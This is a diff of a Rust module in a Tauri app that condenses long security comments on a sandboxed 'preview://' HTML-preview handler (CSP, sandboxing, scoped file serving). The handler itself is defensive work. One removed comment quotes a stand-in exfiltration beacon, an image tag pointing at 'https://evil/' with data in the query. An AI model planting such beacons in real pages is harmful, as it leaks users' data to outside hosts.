@@ -1,74 +1,6 @@
-//! `preview://` — the custom URI scheme that backs the rendered HTML preview.
-//!
-//! # Why a protocol handler at all
-//!
-//! The requirement is an `.html` preview that shows the page as it really is,
-//! with its JS and CSS loaded, as a prerender would, when they are where the page expects them.
-//! Three architectures were considered and two are dead ends:
-//!
-//! - **`<iframe srcdoc>` / `<iframe src="blob:">` with the assets inlined.**
-//!   Documents from a *local scheme* (`about:srcdoc`, `blob:`, `data:`) inherit the
-//!   embedder's policy container, **including its CSP** (CSP3 §"Initialize a global
-//!   object's CSP list"). The preview would therefore inherit the app's
-//!   `script-src 'self'` and its inline scripts would be silently blocked. Making
-//!   them run would mean putting `'unsafe-inline'` in the **app-wide** policy —
-//!   which `docs/design/csp.md` lists as one of the two things that must never be
-//!   added back. Separately, inlining cannot resolve an ES module graph: a
-//!   `<script type="module">` inlined into `about:srcdoc` resolves `import './x.js'`
-//!   against the *parent's* base URL, i.e. into our own bundled assets.
-//! - **Tauri's built-in `assetProtocol`.** Not compiled in — `protocol-asset` is not
-//!   a default feature and `src-tauri/Cargo.toml` enables no tauri features. Turning
-//!   it on would also create a **second** scope authority beside [`allowed_roots`],
-//!   which the single-scope-authority rule exists to prevent.
-//!
-//! A custom scheme is the option where the previewed document has a **real URL**.
-//! That single fact buys everything: relative `href`/`src` resolve natively, `..`
-//! works, `@import` and `url(...)` resolve against the *stylesheet's* URL, ES
-//! modules and their transitive imports resolve, local `@font-face` files load —
-//! all without rewriting one character of somebody else's source. And because the
-//! scheme is not a local scheme, the document does **not** inherit the app's policy,
-//! so this handler gets to give it one of its own that is strictly *tighter*
-//! ([`PREVIEW_CSP`]).
-//!
-//! # The security posture, stated plainly
-//!
-//! This feature runs code from whatever repository the user opened. That is the
-//! point of it, so the question is only *where* that code runs. It runs:
-//!
-//! - inside `<iframe sandbox="allow-scripts">` with **no** `allow-same-origin`, so
-//!   the document has an opaque origin: no access to the parent DOM, no storage, no
-//!   top-level navigation, no forms, no modals. (`allow-scripts` together with
-//!   `allow-same-origin` is the documented sandbox escape — never both.)
-//! - under [`PREVIEW_CSP`], which sets `connect-src 'none'` (no `fetch`/XHR/
-//!   WebSocket egress) and admits no remote origin for anything. The app's own
-//!   policy deliberately allows remote images for README badges; the preview must
-//!   **not**, because a frame that can read local files through this handler would
-//!   otherwise have `<img src="https://evil/?d=…">` as a working exfiltration
-//!   channel.
-//! - with no reach into Tauri IPC. On macOS and Linux the init scripts are injected
-//!   into the main frame only; the opaque origin is the barrier we actually rely on.
-//!   ⚠️ On **Windows** wry documents that `for_main_frame_only` is ignored, so a
-//!   subframe does receive `__TAURI_INTERNALS__` — `connect-src 'none'` is the
-//!   load-bearing mitigation there and must not be relaxed without revisiting this.
-//!
-//! Every request still goes through [`resolve_in_scope`], the same single
-//! enforcement point `read_file` and the search walker use. This
-//! module adds a new *transport* for scoped bytes; it does not add a new scope.
-//!
-//! # URL shape
-//!
-//! The document is served at a URL that **mirrors the filesystem**:
-//! `/Users/sam/proj/index.html` → `preview://localhost/Users/sam/proj/index.html`
-//! (on Windows the platform spelling is `http://preview.localhost/C:/Users/…`).
-//! Mirroring is what makes `../shared/a.css` work: the URL normaliser collapses the
-//! `..` and the resulting path is still canonicalized and scope-checked here. A
-//! per-preview token root would have been eaten by that same normaliser on the first
-//! `..`, breaking the commonest relative path of all.
-//!
-//! Known gap, deliberate: a **root-absolute** `href="/assets/x.css"` resolves to the
-//! filesystem path `/assets/x.css` and 404s. There is no server here and therefore
-//! no document root; inventing one would make the preview silently disagree with
-//! what a real server does. The frontend says so in the preview chrome.
+//! `preview://`: serves previewed HTML at URLs mirroring the filesystem so relative assets, `..`
+//! and ES modules resolve (srcdoc/blob would inherit the app CSP). Every request goes through
+//! [`resolve_in_scope`]; the page runs sandboxed (no `allow-same-origin`) under [`PREVIEW_CSP`].
 
 use std::path::{Path, PathBuf};
 
@@ -81,34 +13,12 @@ use crate::fs_tree::{allowed_roots, resolve_in_scope};
 /// `tauri.conf.json` and the URL the frontend builds.
 pub const SCHEME: &str = "preview";
 
-/// Ceiling on a single served asset.
-///
-/// Not a security boundary — everything served is already inside the user's own
-/// workspace — but a served response is buffered whole in memory, so an accidental
-/// `<img src="a-4gb-core-dump">` must fail as a 404 rather than as an OOM. Set well
-/// above any real web asset and well above `MAX_IMAGE_BYTES`, because unlike the
-/// Markdown preview this path has no base64 expansion to pay for.
+/// Not a security boundary: responses are buffered whole, so a huge asset must 404, not OOM.
 const MAX_ASSET_BYTES: u64 = 64 * 1024 * 1024;
 
-/// The Content-Security-Policy handed to the previewed document.
-///
-/// 🔴 **Scheme-sources (`preview:`), never `'self'`.** Under
-/// `sandbox="allow-scripts"` the document has an *opaque* origin, so `'self'` in its
-/// own policy matches nothing and would block the page's own stylesheet and scripts
-/// — a blank preview with no obvious cause. Scheme matching is on the URL, not the
-/// origin, so `preview:` is the spelling that works.
-///
-/// `'unsafe-inline'` is what lets the page's own inline `<script>` and `<style>` run.
-/// That is the entire feature, and it is scoped to *this* document — it is emphatically
-/// not the app-wide relaxation `docs/design/csp.md` forbids.
-///
-/// `'unsafe-eval'` is deliberately **absent** in v1. The page's code already runs, so
-/// eval adds little risk; it is left off because a security boundary's first version
-/// should be the tight one, and a page that needs it will report itself as a blank
-/// render with a CSP line in the Logs panel. Adding the token here is the whole change.
-///
-/// `connect-src 'none'` is the directive that closes exfiltration, and on Windows it
-/// is the load-bearing mitigation for subframe IPC injection (see the module header).
+/// Scheme-sources (`preview:`), never `'self'`: the sandboxed origin is opaque, so `'self'`
+/// matches nothing. `'unsafe-inline'` is scoped to this document; no `'unsafe-eval'` yet.
+/// `connect-src 'none'` stops exfiltration and is load-bearing on Windows (subframes get IPC).
 pub const PREVIEW_CSP: &str = concat!(
     "default-src preview: http://preview.localhost data: blob: 'unsafe-inline'; ",
     "connect-src 'none'; ",
@@ -118,13 +28,8 @@ pub const PREVIEW_CSP: &str = concat!(
     "http://localhost:1420 http://127.0.0.1:1420"
 );
 
-/// Tauri's asynchronous URI-scheme handler for [`SCHEME`].
-///
-/// Registered on the builder in `lib.rs`. The read happens on a blocking worker, not
-/// on the webview/event-loop thread: a preview of a page with a dozen assets would
-/// otherwise put a dozen synchronous `fs::read`s in front of the UI, and on a network
-/// mount a single one of them can block for seconds. (Same reasoning that made the
-/// search commands `spawn_blocking` — the frozen-app bug.)
+/// Tauri's async URI-scheme handler for [`SCHEME`] (registered in `lib.rs`). Reads run on a
+/// blocking worker, never the event-loop thread, which a slow mount would freeze.
 pub fn handle(
     ctx: UriSchemeContext<'_, tauri::Wry>,
     request: Request<Vec<u8>>,
@@ -138,19 +43,12 @@ pub fn handle(
     });
 }
 
-/// Resolve one `preview://` request against `roots` and build its response.
-///
-/// Split out of [`handle`] with the roots passed in — exactly the shape
-/// `read_image_scoped` uses — so the whole behaviour is unit-testable without a
-/// Tauri `AppHandle`.
+/// Resolve one `preview://` request against `roots`; split from [`handle`] for testability.
 pub(crate) fn serve(uri_path: &str, roots: &[PathBuf]) -> Response<Vec<u8>> {
     match read_scoped_asset(uri_path, roots) {
         Ok((bytes, mime)) => response(StatusCode::OK, mime, bytes),
-        // The reason is in the body for the Logs panel and for a developer with the
-        // inspector open; WebKit shows the user a broken subresource either way. A
-        // 404 for both "missing" and "out of scope" is deliberate: the frame is
-        // running untrusted code, so it must not learn from the status code whether
-        // a path it guessed exists outside the workspace.
+        // 404 for both "missing" and "out of scope": the frame runs untrusted code and must
+        // not learn whether a guessed path exists. The reason is in the body for the Logs panel.
         Err(reason) => response(
             StatusCode::NOT_FOUND,
             "text/plain; charset=utf-8",
@@ -180,27 +78,18 @@ fn response(status: StatusCode, mime: &str, body: Vec<u8>) -> Response<Vec<u8>> 
     Response::builder()
         .status(status)
         .header("Content-Type", mime)
-        // 🔴 On EVERY response, not only on `text/html`. A link click inside the
-        // sandbox can navigate the frame to any in-scope file, and a document served
-        // without a policy would have none at all — an SVG reached that way is a
-        // fully scripted document. One header, no arms to get wrong.
+        // On EVERY response: an in-frame navigation can reach any in-scope file, and an SVG
+        // served without a policy is a fully scripted document.
         .header("Content-Security-Policy", PREVIEW_CSP)
-        // Module scripts are ALWAYS fetched in CORS mode, and a sandboxed frame with
-        // no `allow-same-origin` sends `Origin: null`. Without this header, classic
-        // scripts would work and `<script type="module">` would fail — the most
-        // confusing possible partial failure.
+        // Module scripts are fetched in CORS mode with `Origin: null` from the sandbox;
+        // without this, `<script type="module">` fails while classic scripts work.
         .header("Access-Control-Allow-Origin", "*")
         // Never let the engine upgrade an `application/octet-stream` we chose
         // deliberately into `text/html` it sniffed.
         .header("X-Content-Type-Options", "nosniff")
         .header("Referrer-Policy", "no-referrer")
-        // 🔴 The frontend's "Reload" remounts the iframe, which reloads the
-        // DOCUMENT — but `style.css` and `app.js` are separate requests at their own
-        // URLs, and whether the engine re-fetches them or answers from its own cache
-        // is the engine's decision, not ours. Without this the user edits a
-        // stylesheet, saves, hits Reload and sees nothing change — which reads as
-        // "the reload is broken" rather than "the CSS was cached". We serve local
-        // files off a local disk, so there is no bandwidth to save by caching.
+        // Reload remounts only the document; without this the engine may serve edited CSS/JS
+        // from its cache. Local disk, so there is nothing to save by caching.
         .header("Cache-Control", "no-store")
         .body(body)
         // The builder only fails on an invalid header name/value, all of which are
@@ -208,13 +97,8 @@ fn response(status: StatusCode, mime: &str, body: Vec<u8>) -> Response<Vec<u8>> 
         .unwrap_or_else(|_| Response::new(Vec::new()))
 }
 
-/// Turn a `preview://localhost/<path>` URL path into a filesystem path.
-///
-/// Percent-decoding is a **correctness** requirement, not a security one: a real
-/// `href` to `café.css` arrives as `caf%C3%A9.css`. Traversal is NOT handled here —
-/// `..` is left exactly as written and [`resolve_in_scope`] canonicalizes and
-/// rejects it. That ordering is the whole rule: one enforcement point, in
-/// Rust, and no clever pre-filtering upstream of it that could disagree.
+/// `preview://localhost/<path>` → filesystem path. Percent-decodes (correctness, e.g.
+/// `caf%C3%A9.css`) but leaves `..` alone: [`resolve_in_scope`] is the one enforcement point.
 fn fs_path_from_uri_path(uri_path: &str) -> Result<PathBuf, String> {
     let decoded = percent_decode(uri_path).ok_or("malformed percent-escape in preview URL")?;
     // A NUL cannot appear in a real path and makes `canonicalize`'s CString
@@ -233,12 +117,8 @@ fn fs_path_from_uri_path(uri_path: &str) -> Result<PathBuf, String> {
     }
 }
 
-/// Decode `%XX` escapes in a URL path component, rejecting anything malformed.
-///
-/// Hand-rolled for the same reason `base64_encode` in `fs_tree` is: this repo keeps
-/// its dependency tree deliberately small, and the whole grammar is two hex digits.
-/// `+` is **not** decoded to a space — that is `application/x-www-form-urlencoded`
-/// semantics, and a file may legitimately be named `a+b.css`.
+/// Decode `%XX` escapes, rejecting malformed ones; hand-rolled to keep dependencies small.
+/// `+` is NOT a space (that is form encoding; `a+b.css` is a valid file name).
 fn percent_decode(input: &str) -> Option<String> {
     let bytes = input.as_bytes();
     let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
@@ -270,11 +150,8 @@ fn hex_value(b: u8) -> Option<u8> {
     }
 }
 
-/// The `Content-Type` for a served asset, from its extension.
-///
-/// 🔴 The default is `application/octet-stream`, never `text/html`. Combined with
-/// `nosniff`, that means an unknown file reached by an in-frame navigation is
-/// downloaded-or-nothing, not executed as a document.
+/// `Content-Type` from the extension. Defaults to `application/octet-stream`, never `text/html`:
+/// with `nosniff`, an unknown file reached by navigation is never executed as a document.
 fn content_type(path: &Path) -> &'static str {
     let ext = path
         .extension()
